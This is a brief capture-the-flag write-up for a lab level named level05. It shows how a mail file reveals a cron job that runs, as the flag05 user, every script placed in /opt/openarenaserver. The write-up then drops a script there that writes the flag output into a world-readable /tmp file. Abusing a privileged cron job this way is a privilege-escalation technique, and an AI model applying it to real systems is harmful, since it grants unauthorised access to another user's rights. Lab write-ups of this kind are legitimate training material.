We have a new email. Let's check:
``` shell
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Some bullshit :(
Let's google it like this `*/2 * * * *`.

Ok. Google told me this is a Cron instruction for running a command every two minutes.

Now, let's inspect the command:
``` shell
ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```

So now let's hust place a script in `/opt/openarenaserver/` directory to get the token:

``` shell
echo $(getflag) > /tmp/token
chmod 777 /tmp/token
```

Wait some time and open `/tmp/token` file!


**Resources**
https://devanswers.co/you-have-mail-how-to-read-mail-in-ubuntu/